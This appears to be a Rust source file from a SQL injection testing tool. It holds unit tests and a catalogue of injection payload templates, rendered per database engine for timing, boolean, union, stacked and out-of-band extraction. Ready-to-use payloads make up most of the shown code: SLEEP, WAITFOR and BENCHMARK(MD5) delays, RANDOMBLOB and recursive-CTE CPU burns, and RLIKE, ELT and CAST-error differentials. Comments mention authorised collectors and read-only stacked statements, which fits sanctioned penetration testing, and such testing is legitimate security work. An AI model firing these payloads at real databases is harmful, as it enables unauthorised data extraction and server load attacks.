        // targets that filter SLEEP. It must be MySQL-only and never leak into
        // an engine that has no BENCHMARK function.
        let join = |dbms: DbmsFamily| {
            vectors_for(dbms, VectorChannel::Timing, &ctx_for(dbms))
                .iter()
                .map(|v| v.sql.clone())
                .collect::<Vec<_>>()
                .join("\n")
        };
        let my = join(DbmsFamily::MySQL);
        assert!(my.contains("BENCHMARK("), "MySQL lost its BENCHMARK vector: {my}");
        assert!(my.contains("SLEEP(5)"), "MySQL must still offer SLEEP too: {my}");
        for dbms in [DbmsFamily::PostgreSQL, DbmsFamily::MSSQL, DbmsFamily::Oracle, DbmsFamily::SQLite] {
            assert!(
                !join(dbms).contains("BENCHMARK("),
                "{dbms:?} was given MySQL's BENCHMARK primitive"
            );
        }
    }

    #[test]
    fn union_position_markers_are_distinct_per_column() {
        // The position-marker vector must carry one distinct sentinel per column,
        // so the reflected column can be read off the response.
        let mut ctx = ctx_for(DbmsFamily::MySQL);
        ctx.columns = 3;
        let vectors = vectors_for(DbmsFamily::MySQL, VectorChannel::Union, &ctx);
        let marker = vectors
            .iter()
            .find(|v| v.id.ends_with(":position-markers"))
            .expect("position-markers vector missing");
        // Three sentinels, each opening with LEAK_OPEN, all different.
        let count = marker.sql.matches(LEAK_OPEN).count();
        assert_eq!(count, 3, "expected one marker per column: {}", marker.sql);
        assert!(
            vectors.iter().any(|v| v.id.ends_with(":union-all-null-pad")
                && v.sql.contains("UNION ALL SELECT")),
            "UNION ALL variant missing"
        );
    }
}


// ── engine → primitive mapping ─────────────────────────────────────────────

/// Every channel the catalogue can render.
pub const ALL_CHANNELS: &[VectorChannel] = &[
    VectorChannel::ErrorExtraction,
    VectorChannel::Timing,
    VectorChannel::Boolean,
    VectorChannel::Union,
    VectorChannel::Stacked,
    VectorChannel::Inline,
    VectorChannel::OutOfBand,
];

/// The primitives that apply to an engine on one channel, in the order they
/// should be attempted: cheapest and most portable first.
pub fn primitives_for(dbms: DbmsFamily, channel: VectorChannel) -> Vec<&'static Primitive> {
    use DbmsFamily::*;
    let p = profile(dbms);
    let mut out: Vec<&'static Primitive> = Vec::new();
    match channel {
        VectorChannel::ErrorExtraction => {
            out.extend(match dbms {
                MySQL | MariaDB => MYSQL_ERROR.iter(),
                MSSQL | Sybase => TSQL_ERROR.iter(),
                PostgreSQL => PG_ERROR.iter(),
                Oracle => ORACLE_ERROR.iter(),
                Firebird => FIREBIRD_ERROR.iter(),
                MonetDB => MONETDB_ERROR.iter(),
                Vertica => VERTICA_ERROR.iter(),
                Cache => CACHE_ERROR.iter(),
                Cubrid => CUBRID_ERROR.iter(),
                Virtuoso => VIRTUOSO_ERROR.iter(),
                ClickHouse => CLICKHOUSE_ERROR.iter(),
                Spanner => SPANNER_ERROR.iter(),
                Presto => PRESTO_ERROR.iter(),
                MaxDB => MAXDB_ERROR.iter(),
                Access => ACCESS_ERROR.iter(),
                SQLite => SQLITE_ERROR.iter(),
                DB2 | H2 | HSQLDB | Informix | SAPHANA => CAST_INT_ERROR.iter(),
            });
            // The portable cast is always available as the last resort.
            out.extend(GENERIC_ERROR.iter());
        }
        VectorChannel::Timing => {
            if p.has_delay_primitive() {
                if p.delay == DelayPrimitive::WaitForDelay {
                    out.extend(TSQL_TIMING.iter());
                } else {
                    out.extend(DIRECT_TIMING.iter());
                }
                out.extend(CONDITIONAL_TIMING.iter());
            }
            if p.has_heavy_fallback() {
                out.extend(HEAVY_TIMING.iter());
            }
            // Engine-specific CPU-burn primitives, kept separate because they
            // are not interchangeable: RANDOMBLOB is SQLite-only, REPEAT/
            // REGEXP_SUBSTRING are HSQLDB-only.
            match dbms {
                SQLite => out.extend(SQLITE_CPU_TIMING.iter()),
                HSQLDB => out.extend(HSQLDB_CPU_TIMING.iter()),
                MySQL | MariaDB => out.extend(MYSQL_CPU_TIMING.iter()),
                _ => {}
            }
        }
        VectorChannel::Boolean => {
            out.extend(ARITHMETIC_BOOLEAN.iter());
            out.extend(ERROR_BOOLEAN.iter());
            match dbms {
                MySQL | MariaDB => out.extend(MYSQL_BOOLEAN.iter()),
                PostgreSQL => out.extend(PG_BOOLEAN.iter()),
                Oracle | MaxDB | Informix => out.extend(DUAL_BOOLEAN.iter()),
                SQLite => out.extend(SQLITE_BOOLEAN.iter()),
                _ => {}
            }
        }
        VectorChannel::Union => out.extend(UNION_PROBES.iter()),
        VectorChannel::Stacked => {
            // A stacked vector is only generated for an engine whose profile
            // says the grammar allows a second statement. Oracle, DB2,
            // Informix and Firebird therefore produce none.
            if p.stacked {
                out.extend(READ_ONLY_STACKED.iter());
            }
        }
        VectorChannel::Inline => out.extend(INLINE_SUBQUERY.iter()),
        VectorChannel::OutOfBand => match dbms {
            MySQL | MariaDB => out.extend(MYSQL_OOB.iter()),
            MSSQL | Sybase => out.extend(TSQL_OOB.iter()),
            Oracle => out.extend(ORACLE_OOB.iter()),
            PostgreSQL => out.extend(PG_OOB.iter()),
            _ => {}
        },
    }
    out
}

/// The inner query each catalogue vector should leak for an engine: its version
/// banner where the profile knows one, otherwise a constant, so the vector is
/// still a valid experiment (it proves the channel, not the value).
pub fn extraction_query(p: &DialectProfile) -> String {
    if p.knows_version() {
        format!("SELECT {}", p.version_expr)
    } else {
        "SELECT 1".to_string()
    }
}

/// Render every vector for one engine and channel.
///
/// The boolean channel always yields matched pairs: both arms come from the
/// same primitive, rendered with the true and the false condition.
pub fn vectors_for(dbms: DbmsFamily, channel: VectorChannel, ctx: &VectorContext) -> Vec<Vector> {
    let p = profile(dbms);
    let mut out: Vec<Vector> = Vec::new();
    for prim in primitives_for(dbms, channel) {
        if channel == VectorChannel::Boolean {
            let pair = format!("{}:{}:{}", dbms.label(), channel.label(), prim.slug);
            let mut truth_arm = render_primitive(&p, prim, ctx);
            truth_arm.pair_id = Some(pair.clone());
            let mut false_ctx = ctx.clone();
            false_ctx.truth = !ctx.truth;
            let mut false_arm = render_primitive(&p, prim, &false_ctx);
            false_arm.pair_id = Some(pair);
            out.push(truth_arm);
            out.push(false_arm);
        } else {
            out.push(render_primitive(&p, prim, ctx));
        }
    }
    out
}

/// Every channel for one engine.
pub fn all_for(dbms: DbmsFamily, ctx: &VectorContext) -> Vec<Vector> {
    ALL_CHANNELS
        .iter()
        .flat_map(|c| vectors_for(dbms, *c, ctx))
        .collect()
}

/// How many distinct vectors the catalogue can render for one engine.
pub fn catalog_size(dbms: DbmsFamily, ctx: &VectorContext) -> usize {
    all_for(dbms, ctx).len()
}

/// How many vectors exist across every engine — the size of the whole
/// catalogue, which is the number to compare against a fixed payload list.
pub fn catalogue_total() -> usize {
    let ctx = VectorContext::default();
    DbmsFamily::ALL
        .iter()
        .map(|d| catalog_size(*d, &ctx))
        .sum()
}



// ── timing primitives ──────────────────────────────────────────────────────

/// Unconditional delay inside a scalar subquery (engines with a real sleep).
const DIRECT_TIMING: &[Primitive] = &[
    t("subselect-delay", "AND (SELECT {N} FROM (SELECT {DELAY})x)", EvidenceGate::Always, "The subquery forces the delay expression to be evaluated; the derived table also survives JOIN-style row multiplication"),
    t("boolean-delay", "AND (SELECT {N} FROM (SELECT {DELAY})x WHERE {COND})", EvidenceGate::Always, "The same delay behind a predicate, which is what blind extraction needs"),
];

/// `WAITFOR DELAY` is a statement, not an expression.
const TSQL_TIMING: &[Primitive] = &[
    t("if-waitfor", "IF({COND}) {DELAY}", EvidenceGate::Always, "A statement-level delay, so an in-band predicate alone decides whether it fires"),
    t("stacked-waitfor", ";IF({COND}) {DELAY}", EvidenceGate::AfterFingerprint, "The same delay as a second statement, for drivers that allow batching"),
];

/// Conditional delay in expression form; the shape most contexts can hold.
const CONDITIONAL_TIMING: &[Primitive] = &[
    t("case-when-delay", "AND {N}=(CASE WHEN {COND} THEN ({DELAY}) ELSE {N} END)", EvidenceGate::Always, "CASE WHEN keeps the delay inside an expression, so it survives positions that reject a bare AND"),
];

/// Heavy-query timing: the fallback for engines with no delay primitive.
const HEAVY_TIMING: &[Primitive] = &[
    t("heavy-cartesian", "AND {N}=(SELECT count(*) FROM {H})", EvidenceGate::AfterFingerprint, "A cross-join over a system catalogue burns CPU proportional to the catalogue size"),
    t("conditional-heavy", "AND {N}=(CASE WHEN {COND} THEN (SELECT count(*) FROM {H}) ELSE {N} END)", EvidenceGate::AfterFingerprint, "The same heavy query behind a predicate (the conditional form is what carries data)"),
];

/// CPU burn with no catalogue table involved — engine-specific, because the
/// primitives are not portable (`RANDOMBLOB` is SQLite-only, `REPEAT`/
/// `REGEXP_SUBSTRING` are HSQLDB-only).
const SQLITE_CPU_TIMING: &[Primitive] = &[
    t("randomblob-hash", "AND {N}=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000))))", EvidenceGate::AfterFingerprint, "Forces SQLite to allocate and hash roughly 300 MB (sqlmap's SQLite timing primitive)"),
    t("recursive-cte", "AND {N}=(WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{S}000000) SELECT count(*) FROM c)", EvidenceGate::AfterFingerprint, "A recursive CTE counter: SQLite's other CPU-burn primitive, and the only one that can be made conditional"),
];

const HSQLDB_CPU_TIMING: &[Primitive] = &[
    t("repeat-regexp", "AND 'a'=CASE WHEN {COND} THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR({N}),0),{S}00000000),NULL) ELSE 'a' END", EvidenceGate::AfterFingerprint, "A regexp over a repeated string (sqlmap's heavy query for HSQLDB)"),
];

/// MySQL/MariaDB `BENCHMARK` CPU burn: a documented time primitive distinct
/// from `SLEEP`, for targets that filter `SLEEP` or cap statement time but not
/// CPU. Engine-specific because `BENCHMARK` is MySQL-family only. The iteration
/// count scales with the nominal seconds and is bounded by the same delay cap
/// as every other timing vector, so it cannot be turned into an unbounded load.
const MYSQL_CPU_TIMING: &[Primitive] = &[
    t("benchmark-md5", "AND {N}=BENCHMARK({S}000000,MD5({N}))", EvidenceGate::AfterFingerprint, "BENCHMARK() evaluates MD5() a fixed number of times, burning CPU proportional to the count (MySQL family) — a time signal that never calls SLEEP"),
    t("benchmark-conditional", "AND {N}=(SELECT (CASE WHEN {COND} THEN BENCHMARK({S}000000,MD5({N})) ELSE {N} END))", EvidenceGate::AfterFingerprint, "The same CPU burn behind a predicate, so it carries a blind boolean the way the SLEEP-based conditional form does"),
];

// ── boolean primitives ─────────────────────────────────────────────────────
//
// Each is rendered twice: `{COND}` becomes a matched equality for the true arm
// and a mismatched one for the false arm. Both arms come from the same
// primitive, so the pair is logically matched.

/// The universal differentials.
const ARITHMETIC_BOOLEAN: &[Primitive] = &[
    b("and-arith", "AND {COND}", EvidenceGate::Always, "The baseline differential: one arm's predicate holds, the other's does not"),
    b("subquery-arith", "AND {N}=(SELECT {N} WHERE {COND})", EvidenceGate::Always, "The same differential inside a scalar subquery, for contexts that drop a bare AND"),
    b("case-eq", "AND {N}=(CASE WHEN {COND} THEN {N} ELSE {N2} END)", EvidenceGate::Always, "A CASE differential resolving to a matching or non-matching integer, for filters that block a bare boolean but allow a CASE expression"),
    b("case-arith", ",(CASE WHEN {COND} THEN {N} ELSE {N2} END)", EvidenceGate::Always, "Sort-key differential for ORDER BY / GROUP BY, which take no boolean predicate"),
];

/// A differential that changes the *response class* (error vs no error) rather
/// than the body length — stronger where both arms render the same page.
const ERROR_BOOLEAN: &[Primitive] = &[b(
    "conditional-cast-error",
    "AND {COND} AND {N}=CAST({L} AS int)",
    EvidenceGate::AfterSignal,
    "One arm raises a conversion error and the other does not, so the differential survives an identical body",
)];

/// Engine-specific boolean carriers.
const MYSQL_BOOLEAN: &[Primitive] = &[
    b("rlike-bool", "AND {N} RLIKE (CASE WHEN {COND} THEN CONCAT({W}) ELSE NULL END)", EvidenceGate::AfterSignal, "RLIKE evaluates its right-hand operand (MySQL family), so the differential needs no AND/OR predicate"),
    b("elt-bool", "AND ELT({N},(CASE WHEN {COND} THEN 1 ELSE 0 END))={N}", EvidenceGate::AfterSignal, "ELT indexes into a conditional expression (MySQL family)"),
];

const PG_BOOLEAN: &[Primitive] = &[b(
    "exists-series",
    "AND EXISTS(SELECT 1 FROM generate_series(1,1) WHERE {COND})",
    EvidenceGate::AfterSignal,
    "generate_series gives PostgreSQL a row-producing carrier for the predicate",
)];

const DUAL_BOOLEAN: &[Primitive] = &[b(
    "dual-where",
    "AND {N}=(SELECT {N} FROM DUAL WHERE {COND})",
    EvidenceGate::AfterSignal,
    "FROM DUAL gives Oracle / MaxDB / Informix a row to hang the predicate on",
)];

const SQLITE_BOOLEAN: &[Primitive] = &[b(
    "json-bool",
    "AND {N}=JSON(CASE WHEN {COND} THEN '1' ELSE '2' END)",
    EvidenceGate::AfterSignal,
    "SQLite's JSON() yields a different value per arm (sqlmap's SQLite boolean primitive)",
)];



// ── compact table constructors ─────────────────────────────────────────────
//
// The remaining tables are one line per primitive, so a reviewer can read
// every vector the engine is able to send.

/// Build a primitive.
const fn v(
    slug: &'static str,
    channel: VectorChannel,
    template: &'static str,
    gate: EvidenceGate,
    mechanism: &'static str,
) -> Primitive {
    Primitive {
        slug,
        channel,
        template,
        gate,
        mechanism,
    }
}

/// Error-extraction primitive, gated on fingerprinting the engine first.
const fn err(slug: &'static str, template: &'static str, mechanism: &'static str) -> Primitive {
    v(
        slug,
        VectorChannel::ErrorExtraction,
        template,
        EvidenceGate::AfterFingerprint,
        mechanism,
    )
}

/// Timing primitive.
const fn t(
    slug: &'static str,
    template: &'static str,
    gate: EvidenceGate,
    mechanism: &'static str,
) -> Primitive {
    v(slug, VectorChannel::Timing, template, gate, mechanism)
}

/// Boolean primitive — always emitted as a matched true/false pair.
const fn b(
    slug: &'static str,
    template: &'static str,
    gate: EvidenceGate,
    mechanism: &'static str,
) -> Primitive {
    v(slug, VectorChannel::Boolean, template, gate, mechanism)
}

/// Union primitive.
const fn u(slug: &'static str, template: &'static str, mechanism: &'static str) -> Primitive {
    v(
        slug,
        VectorChannel::Union,
        template,
        EvidenceGate::AfterSignal,
        mechanism,
    )
}

/// Stacked-statement primitive.
const fn st(slug: &'static str, template: &'static str, mechanism: &'static str) -> Primitive {
    v(
        slug,
        VectorChannel::Stacked,
        template,
        EvidenceGate::AfterFingerprint,
        mechanism,
    )
}

/// Inline-subquery primitive.
const fn inl(slug: &'static str, template: &'static str, mechanism: &'static str) -> Primitive {
    v(
        slug,
        VectorChannel::Inline,
        template,
        EvidenceGate::AfterFingerprint,
        mechanism,
    )
}

/// Out-of-band primitive: needs a collector the operator authorised.
const fn oob(slug: &'static str, template: &'static str, mechanism: &'static str) -> Primitive {
    v(
        slug,
        VectorChannel::OutOfBand,
        template,
        EvidenceGate::RequiresCollector,
        mechanism,
    )
}




impl Default for VectorContext {
    fn default() -> Self {
        Self {
            query: "SELECT version()".to_string(),
            seconds: 5,
            columns: 3,
            host: String::new(),
            truth: true,
        }
    }
}
